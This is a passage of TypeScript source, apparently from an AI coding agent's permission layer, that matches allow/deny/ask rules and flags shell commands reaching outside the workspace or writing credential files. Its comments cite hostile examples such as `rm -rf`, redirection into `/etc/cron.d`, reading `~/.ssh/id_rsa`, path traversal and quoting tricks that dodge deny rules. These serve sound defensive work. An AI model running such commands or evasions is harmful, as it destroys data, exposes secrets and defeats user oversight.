import { homedir, tmpdir } from 'node:os'
import { resolve, relative, isAbsolute, posix, sep } from 'node:path'
import type { PermissionRule } from '@shared/types'
import { parsePatch } from './apply-patch'
import { isSensitivePath, writesSensitivePath } from './sensitive-paths'
import type { ToolKind } from './tools'

/**
 * User-defined permission rules, consulted before the coarse approval policy.
 * Each rule matches a tool (by name, or `*` for any) and a glob over the call's
 * "subject" — the shell command, file path, URL, or query the call targets — and
 * resolves to allow (auto-approve), deny (refuse), or ask (always prompt). The
 * first matching rule wins; if none match, the approval policy decides.
 *
 * Examples: allow `run_shell` matching `git status*`; deny `run_shell` matching
 * `* rm -rf *`; ask `write_file` matching `**` (review every write).
 */

/**
 * The egress DESTINATION a `kind:'network'` tool call reaches — the unit of the
 * per-destination network consent (see RunState.networkHosts). "Allow for run" grants
 * this key, not the whole `network` kind, so approving a fetch to `api.github.com`
 * no longer silently also allows egress to an attacker's host.
 *
 * - `web_fetch` / `view_localhost` (any `url` arg) → the URL's lowercased hostname;
 *   a `view_localhost` with `steps` → `<host> (interactive)`, a separate grant.
 * - `gh_*` → `github.com` (every gh call targets GitHub; one grant covers them all).
 * - `web_search` → `web_search` (the query goes to the one configured search provider,
 *   which the user selected; a stable key means a single grant per run).
 * - anything else → the tool name, so an unrecognized network tool still gets a stable,
 *   per-tool grant rather than defaulting to a blanket pass.
 *
 * Always returns a non-empty key (an unparseable URL falls back to the tool name), so
 * the caller never has to treat "no destination" as "allow".
 */
export function networkDestination(toolName: string, args: Record<string, unknown>): string {
  if (toolName.startsWith('gh_')) return 'github.com'
  if (toolName === 'web_search') return 'web_search'
  const url = typeof args.url === 'string' ? args.url : ''
  if (url) {
    try {
      const host = new URL(url).hostname.toLowerCase()
      // Clicking and typing can change a local app's data in a way a screenshot
      // can't, so an interactive view_localhost is its own destination: allowing
      // views of a host for the run never also allows interacting with it.
      if (host && toolName === 'view_localhost' && Array.isArray(args.steps) && args.steps.length) {
        return `${host} (interactive)`
      }
      if (host) return host
    } catch {
      // Malformed URL — fall through to the tool-name key; the fetch tool's own
      // validation surfaces the parse error when it runs.
    }
  }
  return toolName
}

/**
 * Separates the files in an `apply_patch` subject. A patch names each file on a line of
 * its own, so a path inside one can never contain it.
 */
const PATCH_SUBJECT_SEPARATOR = '\n'

/**
 * Every file an `apply_patch` call adds, updates, deletes, or moves to, deduplicated,
 * or [] for a patch that doesn't parse (it fails before writing anything).
 */
function patchTargets(patch: unknown): string[] {
  if (typeof patch !== 'string') return []
  try {
    const paths = parsePatch(patch).flatMap((op) =>
      op.type === 'update' && op.moveTo ? [op.path, op.moveTo] : [op.path]
    )
    return [...new Set(paths)]
  } catch {
    return []
  }
}

/**
 * The files an `apply_patch` subject names (see {@link permissionSubject}), one rule
 * pattern each, for persisting an "Always allow/deny" decision per file.
 */
export function patchSubjectPaths(subject: string): string[] {
  return subject.split(PATCH_SUBJECT_SEPARATOR).filter(Boolean)
}

/** The string a permission rule's pattern is matched against, per tool. */
export function permissionSubject(toolName: string, args: Record<string, unknown>): string {
  const s = (k: string): string => (typeof args[k] === 'string' ? (args[k] as string) : '')
  switch (toolName) {
    case 'run_shell':
      return s('command')
    case 'web_fetch':
      return s('url')
    case 'web_search':
      return s('query')
    case 'apply_patch':
      // The files live inside the patch text, not in a `path` argument, so reading
      // `path` left a patch with no subject: no file rule, not even `*` over a path,
      // could match the files it wrote or deleted. Each is matched (see matchRule).
      return patchTargets(args.patch).join(PATCH_SUBJECT_SEPARATOR)
    default:
      // Namespaced MCP tools (mcp__<id>__<tool>) take arbitrary args, so match on
      // the tool name itself — lets rules target a server/tool, e.g. `mcp__github__*`.
      if (toolName.startsWith('mcp__')) return toolName
      // File-ish tools target a path or pattern.
      return s('path') || s('pattern')
  }
}

/**
 * Split a shell command into the words bash builds from it: unquoted whitespace
 * separates words, and the quoted, escaped, and bare pieces between it join into one,
 * each read as {@link readShellSpan} reads it. So `"cd"k` is the one word `cdk` (not
 * `cd` and `k`), `\/etc` and `$'\x2fetc'` are `/etc`, and `''` is an empty word. A
 * backslash-newline joins lines. Not a full shell parser: nothing is expanded, and an
 * operator stays inside a word it touches (`a>b` is one word).
 */
function tokenizeShellCommand(command: string): string[] {
  const words: string[] = []
  let word: string | null = null
  for (let i = 0; i < command.length; ) {
    if (command[i] === '\\' && command[i + 1] === '\n') {
      i += 2 // a line continuation: no character, and no word break
    } else if (/\s/.test(command[i])) {
      if (word !== null) words.push(word)
      word = null
      i += 1
    } else {
      const span = readShellSpan(command, i)
      word = (word ?? '') + (span ? span.text : command[i])
      i = span ? span.end : i + 1
    }
  }
  if (word !== null) words.push(word)
  return words
}

/**
 * The command split on whitespace, with a span in `"` or `'` kept whole and unwrapped
 * and every backslash left as written. Not the words bash runs (see
 * {@link tokenizeShellCommand}), but how a Windows path such as `C:\Users\x` or
 * `..\..\x` reads, so {@link shellReferencesExternalPath} scans these words too.
 */
function plainShellWords(command: string): string[] {
  const words: string[] = []
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g
  let m: RegExpExecArray | null
  while ((m = re.exec(command)) !== null) {
    words.push(m[1] ?? m[2] ?? m[3] ?? '')
  }
  return words
}

/**
 * The absolute filesystem location a path-like segment points at, or `null` when the
 * segment is not an absolute/home/Windows path (i.e. it is relative). `~`, `$HOME`,
 * and `${HOME}` expand to the home directory; the checks are boundary-anchored so
 * `$HOMEWORK` is not mistaken for `$HOME`.
 */
function absoluteTarget(seg: string): string | null {
  if (seg.startsWith('/')) return seg
  if (seg === '~' || seg.startsWith('~/')) return homedir() + seg.slice(1)
  if (seg === '$HOME' || seg.startsWith('$HOME/')) return homedir() + seg.slice('$HOME'.length)
  if (seg === '${HOME}' || seg.startsWith('${HOME}/')) return homedir() + seg.slice('${HOME}'.length)
  // Windows drive-absolute (`C:\` or `C:/`) and UNC (`\\host\share`) paths.
  if (/^[A-Za-z]:[\\/]/.test(seg) || seg.startsWith('\\\\')) return seg
  return null
}

/** Strip one matching pair of surrounding single/double quotes from a segment. */
function stripSurroundingQuotes(seg: string): string {
  if (seg.length >= 2) {
    const q = seg[0]
    if ((q === '"' || q === "'") && seg[seg.length - 1] === q) return seg.slice(1, -1)
  }
  return seg
}

/**
 * Peel a leading shell redirection operator off a token, returning the path glued to
 * it, or `null` when the token is not a glued redirection. Handles `>`, `>>`, `<`,
 * `<<`, `<<<`, `<>`, `>|`, `>&`, `&>` with an optional leading fd (`2>`, `1>>`), so a
 * target written without a space (`>/etc/x`, `<~/.ssh/id_rsa`, `2>/abs/log`) is still
 * analysed. The spaced form is already a separate token and handled directly.
 */
function stripRedirection(token: string): string | null {
  const m = /^\d*(?:>>|<<<|<<|<>|>\||>&|&>|>|<)(.+)$/.exec(token)
  return m ? m[1]! : null
}

/**
 * Whether `target` resolves inside one of the workspace `roots`. Lexical only — `.`
 * and `..` are normalized, but symlinks are not walked (that is the sandbox's job).
 */
function isWithinRoots(target: string, roots: string[]): boolean {
  const t = resolve(target)
  for (const root of roots) {
    const rel = relative(resolve(root), t)
    if (rel === '' || (!rel.startsWith('..') && !isAbsolute(rel))) return true
  }
  return false
}

/**
 * Character devices that carry no file content: discarding output (`2>/dev/null`),
 * reading zeros/entropy, or addressing the process's own stdio. Naming one is not a
 * read of anything outside the workspace, so it must not trip the escape check.
 */
const STDIO_DEVICE_RE = /^\/dev\/(?:null|zero|random|urandom|tty|stdin|stdout|stderr|fd\/\d+)$/

/**
 * The scratch directories the shell sandbox already lets a command write to (see the
 * darwin/linux backends and run_shell's description): the resolved `tmpdir()`, `/tmp`
 * (and its macOS realpath `/private/tmp`), and `$TMPDIR`. Resolved per call so a
 * changed `TMPDIR` is honoured.
 */
function scratchDirs(): string[] {
  const dirs = [tmpdir(), '/tmp', '/private/tmp']
  if (process.env.TMPDIR) dirs.push(process.env.TMPDIR)
  return dirs
}

/**
 * Whether an absolute target is a place a routine command touches without reaching
 * user data: a stdio/null device, or the sandbox-writable temp dirs agents use for
 * logs and scratch files (`> /tmp/server.log`). Lexical like {@link isWithinRoots},
 * so `/tmp/../etc/passwd` normalizes to `/etc/passwd` and is not exempt.
 */
function isScratchTarget(abs: string): boolean {
  // POSIX-normalized, not host-resolved: on Windows `resolve('/dev/null')` is
  // `D:\\dev\\null`, yet `/dev/null` is what Git Bash (and every POSIX shell) means.
  // normalize still collapses `..`, so `/dev/null/../../etc/passwd` is not exempt.
  if (STDIO_DEVICE_RE.test(posix.normalize(abs.replaceAll('\\', '/')))) return true
  return isWithinRoots(abs, scratchDirs())
}

/**
 * Whether a single path-like segment escapes the workspace `roots`.
 *
 * - An absolute / home / Windows path escapes only when it resolves OUTSIDE every
 *   root. An absolute path INTO the workspace (e.g. `cd /abs/workspace && …`, which
 *   agents emit constantly) is NOT an escape — a purely syntactic "any absolute path
 *   escapes" check flagged all of them and forced needless approvals in full-auto.
 * - A relative path escapes iff it climbs above the run's cwd (the workspace root)
 *   via `..` (`../x`, `a/../../b`, `..\x`). This is a lexical property, independent of
 *   the roots. A relative path that climbs then returns (`a/../b`) stays inside.
 */
function segmentEscapesWorkspace(seg: string, roots: string[]): boolean {
  if (!seg) return false
  // A word can still hold a quote pair: a plain word keeps one glued after `=` or a
  // redirection (`--file="/etc/x"`), and a bash word holds one as text when it was
  // escaped or nested (`\"/etc/x\"`, `'"/etc/x"'`), which an `eval` or `sh -c` reads as
  // quoting. Peel a surrounding pair so the value is analysed.
  seg = stripSurroundingQuotes(seg)
  if (!seg) return false
  const abs = absoluteTarget(seg)
  if (abs !== null) return !isWithinRoots(abs, roots) && !isScratchTarget(abs)
  // Relative. Treat backslashes as separators too, so Windows-style relative climbs
  // (`..\x`) are analysed the same as POSIX ones. A token with no separator and no
  // ".." can't climb out.
  const norm = seg.replace(/\\/g, '/')
  if (!norm.includes('/') && norm !== '..') return false
  let depth = 0
  for (const part of norm.split('/')) {
    if (part === '' || part === '.') continue
    if (part === '..') {
      depth -= 1
      if (depth < 0) return true
    } else {
      depth += 1
    }
  }
  return false
}

/**
 * Whether a `run_shell` command references a filesystem path outside the workspace
 * `roots` — an absolute/home path that resolves outside every root, or a relative
 * path that climbs above the workspace root. Also inspects the value side of an `=`
 * (so env prefixes like `FOO=/etc/x` and flags like `--file=/etc/x` are caught). The
 * words are read as bash builds them (see {@link tokenizeShellCommand}), so quoting or
 * escaping a path (`$'/etc'`, `\/etc`, `x"/../.."/y`) doesn't hide it, and again with
 * backslashes kept (see {@link plainShellWords}), so a Windows path is seen too.
 *
 * Best-effort and deliberately conservative: a command that escapes is escalated
 * for approval, never silently auto-run. It can't catch paths hidden behind
 * variable or command substitution — those defeat any static scan — so it's a
 * tripwire, not a sandbox. The sandbox remains the real confinement boundary.
 */
export function shellReferencesExternalPath(command: string, roots: string[]): boolean {
  // Either reading naming an outside path flags the command: over-flagging only asks.
  for (const token of [...tokenizeShellCommand(command), ...plainShellWords(command)]) {
    if (segmentEscapesWorkspace(token, roots)) return true
    // A redirection glued to its target (`>/etc/cron.d/evil`, `<~/.ssh/id_rsa`,
    // `2>/abs/log`) keeps the operator inside the token; peel it so the path is seen.
    const redir = stripRedirection(token)
    if (redir !== null && segmentEscapesWorkspace(redir, roots)) return true
    // `KEY=value` / `--flag=value`: the path may sit after the first `=`.
    const eq = token.indexOf('=')
    if (eq >= 0 && segmentEscapesWorkspace(token.slice(eq + 1), roots)) return true
  }
  return false
}

/** Commands that create, overwrite, or remove the files named in their arguments. */
const FILE_WRITING_COMMANDS = new Set([
  'tee',
  'cp',
  'mv',
  'install',
  'ln',
  'rsync',
  'truncate',
  'rm',
  'unlink',
  'shred',
  'dd'
])

/** Editors that rewrite a file in place when given `-i` (`sed -i`, `perl -pi`, `ruby -i`). */
const IN_PLACE_EDITORS = new Set(['sed', 'gsed', 'perl', 'ruby'])

/** Words that run the next word as the command (`sudo cp …`, `env FOO=1 tee …`). */
const COMMAND_PREFIXES = new Set(['sudo', 'env', 'command', 'exec', 'nohup', 'time', 'nice'])

/**
 * Whether a `run_shell` command writes to, or removes, a credential / secret file
 * (see isSensitivePath): an output redirection into one (`> .env`, `>>.env`,
 * `&> .env`), a file-writing command naming one (`cp .env.example .env`, `tee .env`,
 * `rm .env`, `dd of=.env`), or an in-place edit of one (`sed -i … .env`). Reading
 * (`cat .env`, `source .env`) doesn't count. Like {@link shellReferencesExternalPath}
 * it is a static tripwire: a path built from variables or substitutions isn't seen.
 */
export function shellWritesSensitivePath(command: string): boolean {
  for (const segment of splitShellCommand(command)) {
    // Bash's words (`\.env` and `".e"nv` are `.env`) and the plain ones (a Windows
    // path keeps its backslashes): either reading naming a credential file flags it.
    for (const tokens of [tokenizeShellCommand(segment), plainShellWords(segment)]) {
      for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i]!
        // Output redirection, spaced (`> .env`) or glued (`>.env`, `2>>.env`). `>&2` is a
        // descriptor duplication, not a file.
        if (/^\d*(?:>>|>\||&>>|&>|>)$/.test(token)) {
          const target = tokens[i + 1]
          if (target !== undefined && isSensitivePath(stripSurroundingQuotes(target))) return true
          continue
        }
        const glued = /^\d*(?:>>|>\||&>>|&>|>)([^&].*)$/.exec(token)
        if (glued && isSensitivePath(stripSurroundingQuotes(glued[1]!))) return true
      }
      // The command word: past `FOO=bar` assignments and prefixes like `sudo`.
      let c = 0
      while (
        c < tokens.length &&
        (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[c]!) || COMMAND_PREFIXES.has(tokens[c]!))
      ) {
        c++
      }
      const word = tokens[c]
      if (word === undefined) continue
      const cmd = word.slice(word.lastIndexOf('/') + 1)
      const args = tokens.slice(c + 1)
      const namesSensitive = (): boolean =>
        args.some((a) => {
          if (a.startsWith('-')) return false
          // `dd of=.env`, `--target=.env`: the path may follow an `=`.
          const eq = a.indexOf('=')
          return isSensitivePath(a) || (eq >= 0 && isSensitivePath(a.slice(eq + 1)))
        })
      if (FILE_WRITING_COMMANDS.has(cmd) && namesSensitive()) return true
      if (
        IN_PLACE_EDITORS.has(cmd) &&
        args.some((a) => /^-[A-Za-z]*i/.test(a) || a.startsWith('--in-place')) &&
        namesSensitive()
      ) {
        return true
      }
    }
  }
  return false
}

/**
 * Whether a tool call creates, overwrites, or removes a credential / secret file: a
 * write tool targeting one (see writesSensitivePath) or a `run_shell` command that
 * writes one (see {@link shellWritesSensitivePath}). The one definition shared by the
 * main loop's approval gate and the subagent gate, so neither can judge benign a
 * call the other would have prompted for.
 */
export function isSensitiveWrite(kind: ToolKind, toolName: string, args: Record<string, unknown>): boolean {
  if (kind === 'write') return writesSensitivePath(toolName, args)
  return (
    kind === 'shell' &&
    toolName === 'run_shell' &&
    typeof args.command === 'string' &&
    shellWritesSensitivePath(args.command)
  )
}

/**
 * Validate untrusted JSON from a *tighten-only* settings source — the per-project
 * `.houston/settings.json` and the admin managed policy — into safe permission rules:
 * well-formed entries whose action is `deny` or `ask` only. `allow` rules (and any
 * other keys such as hooks/mcpServers) are dropped, so such a source can only ever
 * make the agent MORE cautious — it can never auto-approve an action or spawn a
 * process. Capped at `maxRules` as a DoS guard against a pathologically large file.
 * Pure + exported for testing.
 */
export function parseTightenOnlyRules(raw: unknown, maxRules: number): PermissionRule[] {
  const rules = (raw as { permissionRules?: unknown })?.permissionRules
  if (!Array.isArray(rules)) return []
  const out: PermissionRule[] = []
  for (const r of rules) {
    if (out.length >= maxRules) break
    if (typeof r !== 'object' || r === null) continue
    const { action, tool, match, exact } = r as Record<string, unknown>
    if (action !== 'deny' && action !== 'ask') continue // never honor `allow` (would loosen)
    if (typeof tool !== 'string' || typeof match !== 'string') continue
    out.push(exact === true ? { action, tool, match, exact } : { action, tool, match })
  }
  return out
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

/**
 * Which flavour of subject a tool's permission pattern is matched against, so the
 * matcher can canonicalize both sides consistently before comparing:
 * - `shell`  — a command line (handled by {@link matchShellRule}, dequoted).
 * - `url`    — an http(s) URL; scheme + host are case-folded (see {@link lowerUrlAuthority}).
 * - `path`   — a filesystem path/glob; canonicalized + anchored to the roots.
 * - `opaque` — a free-form string (a search query, an MCP tool name); matched verbatim.
 */
function subjectKind(toolName: string): 'shell' | 'url' | 'path' | 'opaque' {
  if (toolName === 'run_shell') return 'shell'
  if (toolName === 'web_fetch') return 'url'
  if (toolName === 'web_search' || toolName.startsWith('mcp__')) return 'opaque'
  return 'path'
}

// The leading `scheme://authority` of a URL (authority = optional userinfo, host,
// optional :port — everything up to the first `/`, `?`, or `#`). Scheme and host
// are case-insensitive per RFC 3986, so both are lowercased before matching; the
// path/query/fragment that follow stay case-sensitive. Anchored, so only the
// leading authority is touched — a `*`-only pattern (no scheme) is left alone.
const URL_AUTHORITY_RE = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/[^/?#]*/

/** Lowercase a URL's scheme + host so `HTTPS://Evil.COM/x` and `https://evil.com/x` match. */
function lowerUrlAuthority(s: string): string {
  return s.replace(URL_AUTHORITY_RE, (m) => m.toLowerCase())
}

/**
 * Canonicalize a filesystem-path SUBJECT to the absolute, lexically-normalized
 * location the file tools themselves would act on (same resolution as
 * `resolveInRoots`): `.`/`..` collapsed, `~`/`$HOME` expanded, relative paths
 * anchored at the first root. So equivalent spellings of one location compare
 * equal — a deny can't be dodged by `/tmp/../etc/passwd`, and a relative `allow`
 * rule can't be widened by `src/../../../etc/passwd` climbing out of the tree.
 */
function canonicalizePath(p: string, roots: string[]): string {
  const abs = absoluteTarget(p)
  if (abs !== null) return resolve(abs)
  const base = roots[0] ?? process.cwd()
  return resolve(base, p)
}

/**
 * The canonical absolute form(s) of a path RULE PATTERN (the `*` wildcard survives
 * — it is an ordinary character to the path normalizer). An absolute/home pattern
 * anchors once; a RELATIVE pattern (e.g. `src/*`) is anchored to EACH root, so it
 * matches a file under any workspace root, not just the first.
 */
function candidatePatternPaths(pattern: string, roots: string[]): string[] {
  const abs = absoluteTarget(pattern)
  if (abs !== null) return [resolve(abs)]
  const bases = roots.length ? roots : [process.cwd()]
  return bases.map((b) => resolve(b, pattern))
}

/**
 * Whether a canonicalized path `subject` matches a path rule `rawPattern` (anchored
 * to the roots). Preserves the two special cases {@link patternMatches} enforces
 * on the raw pattern — an empty pattern is inert (matches nothing), and a pure
 * `*`/`**` (or `/`) pattern matches everything — BEFORE anchoring, so an empty
 * match can't be resolved into "the root directory, and everything under it".
 */
function pathPatternMatches(rawPattern: string, roots: string[], subject: string): boolean {
  const raw = rawPattern.trim()
  if (!raw) return false
  if (/^[*/]+$/.test(raw)) return true
  for (const cand of candidatePatternPaths(raw, roots)) {
    if (globMatches(cand, subject)) return true
    // Bare directory prefix: `src` (→ `<root>/src`) covers `<root>/src/a.ts`. Both the
    // host separator and `/`: resolved paths use `\\` on Windows, and a deny on a
    // directory must still fire for the files inside it there.
    if (subject === cand || subject.startsWith(`${cand}${sep}`) || subject.startsWith(`${cand}/`)) return true
  }
  return false
}

/**
 * Whether `subject` matches a permission `pattern`, where `*` is the only wildcard
 * and — unlike a path glob — it spans ANY characters, including `/`. This is the
 * crux for URLs and nested paths: a rule like `https://host/*` or `src/*` must match
 * `https://host/a/b` and `src/a/b.ts`, not just one path segment. A segment-scoped
 * `*` silently under-matches, which for an `allow` rule means needless re-prompts
 * and for a `deny` rule means it fails to fire at all.
 */
function globMatches(pattern: string, subject: string): boolean {
  const re = new RegExp(`^${pattern.split('*').map(escapeRegExp).join('.*')}$`)
  return re.test(subject)
}

/**
 * Whether two patterns in the `*`-only glob language (where `*` matches any run of
 * characters, including empty) share at least one common matching string. Symmetric.
 * Used by rule cleanup to detect when a generalized allow would overlap a deny's
 * command-set — a check a one-directional literal match can't make. O(|a|·|b|) via
 * memoized alignment: at each position, a `*` on either side either matches nothing
 * (advance past it) or absorbs the character the other side contributes (advance the
 * other); two literals must be equal and advance together.
 */
function globsIntersect(a: string, b: string): boolean {
  const memo = new Map<number, boolean>()
  const solve = (i: number, j: number): boolean => {
    if (i === a.length && j === b.length) return true
    if (i === a.length) return b[j] === '*' && solve(i, j + 1)
    if (j === b.length) return a[i] === '*' && solve(i + 1, j)
    const memoKey = i * (b.length + 1) + j
    const cached = memo.get(memoKey)
    if (cached !== undefined) return cached
    let result: boolean
    if (a[i] === '*' || b[j] === '*') result = solve(i + 1, j) || solve(i, j + 1)
    else result = a[i] === b[j] && solve(i + 1, j + 1)
    memo.set(memoKey, result)
    return result
  }
  return solve(0, 0)
}

/**
 * Whether an EXACT rule's `pattern` names `subject` (already canonicalized by kind)
 * itself: the same resolved path (a relative pattern anchored to each root, as for a
 * glob), the same URL with scheme and host case-folded, or the same string. `*` is an
 * ordinary character and nothing extends past the pattern, so an exact `src` covers
 * the directory entry `src` and not `src/a.ts`. A blank pattern is inert, as for a glob.
 */
function exactSubjectMatches(
  kind: ReturnType<typeof subjectKind>,
  pattern: string,
  roots: string[],
  subject: string
): boolean {
  if (!pattern.trim()) return false
  if (kind === 'path') return candidatePatternPaths(pattern, roots).includes(subject)
  if (kind === 'url') return lowerUrlAuthority(pattern) === subject
  return pattern === subject
}

function patternMatches(pattern: string, subject: string): boolean {
  const p = pattern.trim()
  // An empty pattern matches NOTHING (the rule is inert), not everything — a blank
  // match must never silently auto-approve/deny every call. Use `*` for match-all.
  if (!p) return false
  if (p === '*') return true
  if (globMatches(p, subject)) return true
  // Bare-prefix convenience: a wildcard-free rule also matches at a command (" ") or
  // path/URL ("/") boundary, so `https://host` covers `https://host/x` and `src`
  // covers `src/a.ts` — without forcing the user to append `/*`.
  return subject === p || subject.startsWith(`${p} `) || subject.startsWith(`${p}/`)
}

/**
 * First matching rule's action for a single (non-shell) subject, or null. Both the
 * subject and each rule pattern are canonicalized by kind before comparing — URLs
 * case-folded on scheme+host, filesystem paths resolved and anchored to the roots —
 * so a rule can't be dodged (deny) or widened (allow) by a spelling that resolves
 * to the same target. An `exact` rule matches only its one literal subject (see
 * {@link exactSubjectMatches}).
 */
function matchOne(
  rules: PermissionRule[],
  toolName: string,
  subject: string,
  roots: string[] = []
): PermissionRule['action'] | null {
  const kind = subjectKind(toolName)
  const canonSubject =
    kind === 'url' ? lowerUrlAuthority(subject) : kind === 'path' ? canonicalizePath(subject, roots) : subject
  for (const r of rules) {
    if (r.tool && r.tool !== '*' && r.tool !== toolName) continue
    const match = r.match ?? ''
    const hit = r.exact
      ? exactSubjectMatches(kind, match, roots, canonSubject)
      : kind === 'path'
        ? pathPatternMatches(match, roots, canonSubject)
        : kind === 'url'
          ? patternMatches(lowerUrlAuthority(match), canonSubject)
          : patternMatches(match, canonSubject)
    if (hit) return r.action
  }
  return null
}

/**
 * Collapse every whitespace run, quoted or not, and trim: how a deny or ask rule reads
 * a command, so trivial spacing variants match the same rule. An allow reads
 * whitespace the way bash does instead (see {@link literalShellUnits}).
 */
function normalizeShellCommand(s: string): string {
  return s.replace(/\s+/g, ' ').trim()
}

/**
 * Whether `c` is a blank bash splits words on: space, tab, or newline. Other
 * whitespace (`\r`, `\v`, `\f`, a no-break space) is part of a word to bash.
 */
function isShellBlank(c: string): boolean {
  return c === ' ' || c === '\t' || c === '\n'
}

/**
 * `s` without the unquoted blanks (see {@link isShellBlank}) at either end. A quoted
 * or escaped one stays: the space in `find . -delete \ ` is an argument to bash.
 */
function trimShellBlanks(s: string): string {
  let start = 0
  while (start < s.length && isShellBlank(s[start])) start += 1
  let end = start
  for (let i = start; i < s.length; ) {
    const next = readShellSpan(s, i)?.end ?? i + 1
    if (!isShellBlank(s[i])) end = Math.min(next, s.length)
    i = next
  }
  return s.slice(start, end)
}

/** Whether `s` ends in a backslash that escapes nothing, which bash drops. */
function endsInLoneBackslash(s: string): boolean {
  for (let i = 0; i < s.length; ) {
    if (s[i] === '\\' && i === s.length - 1) return true
    i = readShellSpan(s, i)?.end ?? i + 1
  }
  return false
}

/**
 * Shell text as an allow rule saves it: each run of unquoted blanks (see
 * {@link isShellBlank}) becomes one space and those at either end go, while quoted and
 * escaped text, whitespace included, stays as written. So `rm   'my  file'` is saved
 * as `rm 'my  file'`, and `find . -delete \ ` keeps its escaped space. A trailing lone
 * backslash is dropped, since bash drops it too: a saved rule never ends in one (see
 * {@link shellAllowMatches}). {@link literalShellUnits} reads the result as it reads `s`.
 */
function shellRuleText(s: string): string {
  let out = ''
  let gap = false
  for (let i = 0; i < s.length; ) {
    if (isShellBlank(s[i])) {
      gap = out !== ''
      i += 1
    } else if (s[i] === '\\' && i === s.length - 1) {
      i += 1
    } else {
      if (gap) out += ' '
      gap = false
      const end = readShellSpan(s, i)?.end ?? i + 1
      out += s.slice(i, end)
      i = end
    }
  }
  return out
}

/** The single-character escapes of bash's ANSI-C quoting (`$'...'`). */
const ANSI_C_ESCAPES = new Map([
  ['a', '\x07'],
  ['b', '\b'],
  ['e', '\x1b'],
  ['E', '\x1b'],
  ['f', '\f'],
  ['n', '\n'],
  ['r', '\r'],
  ['t', '\t'],
  ['v', '\v'],
  ['\\', '\\'],
  ["'", "'"],
  ['"', '"'],
  ['?', '?']
])

/**
 * The run of hex digits (at most `max`) at `s[i]`, as its value (wrapping at 32 bits,
 * like bash's `int`) and the index past it; `n` is how many digits there were.
 */
function hexRun(s: string, i: number, max: number): { value: number; n: number; end: number } {
  let value = 0
  let n = 0
  while (n < max && i < s.length && /[0-9A-Fa-f]/.test(s[i])) {
    value = (value * 16 + parseInt(s[i], 16)) >>> 0
    n += 1
    i += 1
  }
  return { value, n, end: i }
}

/**
 * Decode the body of a bash ANSI-C quoted string (`$'...'`) the way bash does: the C
 * escapes in {@link ANSI_C_ESCAPES}, octal `\nnn`, hex `\xHH` and `\x{H...}`,
 * `\uHHHH`, `\UHHHHHHHH`, and `\cX` (control-X). An unknown escape keeps its backslash,
 * and a NUL ends the string, as in bash.
 */
function decodeAnsiC(body: string): string {
  let out = ''
  const emit = (code: number): boolean => {
    if (code === 0) return false
    out += String.fromCharCode(code)
    return true
  }
  for (let i = 0; i < body.length; ) {
    if (body[i] !== '\\' || i + 1 >= body.length) {
      out += body[i]
      i += 1
      continue
    }
    const e = body[i + 1]
    i += 2
    const simple = ANSI_C_ESCAPES.get(e)
    if (simple !== undefined) {
      out += simple
    } else if (e >= '0' && e <= '7') {
      let code = Number(e)
      for (let k = 0; k < 2 && i < body.length && body[i] >= '0' && body[i] <= '7'; k++, i++) {
        code = code * 8 + Number(body[i])
      }
      if (!emit(code & 0xff)) break
    } else if (e === 'x') {
      const braced = body[i] === '{'
      const run = hexRun(body, braced ? i + 1 : i, braced ? Infinity : 2)
      if (!braced && run.n === 0) {
        out += '\\x' // no hex digit: kept as written
        continue
      }
      i = braced && body[run.end] === '}' ? run.end + 1 : run.end
      if (!emit(run.value & 0xff)) break
    } else if (e === 'u' || e === 'U') {
      const run = hexRun(body, i, e === 'u' ? 4 : 8)
      const v = run.value
      // A value that is no character (none, a surrogate, past U+10FFFF) stays as written.
      if (run.n === 0 || (v >= 0xd800 && v <= 0xdfff) || v > 0x10ffff) {
        out += body.slice(i - 2, run.end)
      } else if (v === 0) {
        break
      } else {
        out += String.fromCodePoint(v)
      }
      i = run.end
    } else if (e === 'c' && i < body.length) {
      const x = body[i]
      i += x === '\\' && body[i + 1] === '\\' ? 2 : 1 // `\c\\` is control-backslash
      if (!emit(x === '?' ? 0x7f : x.charCodeAt(0) & 0x1f)) break
    } else {
      out += `\\${e}`
    }
  }
  return out
}

/**
 * The ANSI-C quoted string `$'...'` whose `$` is at `s[start]`: its decoded text (see
 * {@link decodeAnsiC}) and the index past its closing quote. A backslash pairs with the
 * next character first, so `\'` does not close it.
 */
function readAnsiCQuote(s: string, start: number): { text: string; end: number } {
  let j = start + 2
  while (j < s.length && s[j] !== "'") j += s[j] === '\\' ? 2 : 1
  return { text: decodeAnsiC(s.slice(start + 2, Math.min(j, s.length))), end: Math.min(j + 1, s.length) }
}

/**
 * The quoted or escaped span of shell text that starts at `s[i]`, read as the shell
 * reads it, and the index past it; null when `s[i]` is an ordinary character. A
 * backslash escapes the next character (and is dropped); single quotes are literal; in
 * double quotes a backslash escapes only `"`, `` ` ``, `$`, and `\`, and a
 * backslash-newline is deleted there (a line continuation, as in bash). A `$'...'`
 * string is decoded (see {@link decodeAnsiC}), and a `$"..."` one reads as the plain
 * double-quoted string (its text untranslated). `$$` is the shell's PID, read as a pair
 * so the `'` after it opens a plain single-quoted string. An unclosed quote runs to the
 * end of `s`.
 */
function readShellSpan(s: string, i: number): { text: string; end: number } | null {
  const c = s[i]
  if (c === '$') {
    if (s[i + 1] === '$') return { text: '$$', end: i + 2 }
    if (s[i + 1] === "'") return readAnsiCQuote(s, i)
    if (s[i + 1] === '"') return readShellSpan(s, i + 1)
    return null
  }
  if (c === '\\') return { text: s[i + 1] ?? '', end: i + 2 }
  if (c === "'") {
    const close = s.indexOf("'", i + 1)
    return close === -1 ? { text: s.slice(i + 1), end: s.length } : { text: s.slice(i + 1, close), end: close + 1 }
  }
  if (c !== '"') return null
  let text = ''
  let j = i + 1
  while (j < s.length && s[j] !== '"') {
    if (s[j] === '\\' && j + 1 < s.length && '"`$\\\n'.includes(s[j + 1])) {
      if (s[j + 1] !== '\n') text += s[j + 1]
      j += 2
    } else {
      text += s[j]
      j += 1
    }
  }
  return { text, end: j + 1 }
}

/**
 * Reduce a shell command to the logical text the shell would execute, by stripping
 * quotes and resolving backslash escapes (see {@link readShellSpan}): `"rm"`, `r''m`,
 * `\rm`, `$'\x72m'`, and `rm -r"f"` all collapse to `rm`. Without this, a deny rule
 * like `*rm -rf*` is trivially dodged by quoting the program name — the literal
 * command string no longer contains the token `rm -rf`, so the pattern never fires.
 * Applied to BOTH a deny or ask rule's pattern and the command before matching, so a
